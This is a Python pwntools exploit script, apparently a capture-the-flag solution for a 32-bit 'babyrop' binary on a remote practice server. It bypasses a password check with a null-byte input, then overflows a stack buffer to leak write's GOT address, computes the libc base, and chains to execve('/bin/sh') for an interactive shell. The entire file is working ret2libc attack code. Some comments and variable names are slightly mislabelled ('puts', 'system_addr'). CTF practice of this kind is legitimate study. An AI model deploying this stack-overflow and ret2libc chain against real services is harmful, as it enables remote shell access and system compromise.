from pwn import *
from LibcSearcher import *

#p = process('./babyrop')
p = remote('node3.buuoj.cn',26586)
elf = ELF('babyrop')
elf_libc = ELF('libc-2.23.so')

#context.log_level = 'debug'

#only write function has been called
#write function pass the params by stack
write_got = elf.got['write']
write_plt = elf.plt['write']

#bypass password check
payload = b'\0' + b'a' * 6 + b'\xff'

p.sendline(payload)

p.recvuntil('Correct\n')

main_address = 0x08048825

#try get got of puts and return to main
#                             also ebp of write
#	   filled                ret address    ret address of write   p1           p2           p3
payload = b'a' * ( 0xe7 + 4 ) + p32(write_plt) + p32(main_address) + p32(1) + p32(write_got) + p32(4)

p.sendline(payload)

write_real_addr = u32(p.recv(4))

libc_base = write_real_addr - elf_libc.symbols['write']
system_addr = libc_base + elf_libc.symbols['execve']
bin_str_addr = libc_base + 0x0015902b

p.sendline(b'\0' + b'a' * 6 + b'\xff')
p.recvuntil('Correct\n')

payload = b'a' * ( 0xe7 + 4 ) + p32(system_addr) + p32(0x123) + p32(bin_str_addr) + p32(0) + p32(0)

p.sendline(payload)

p.interactive()
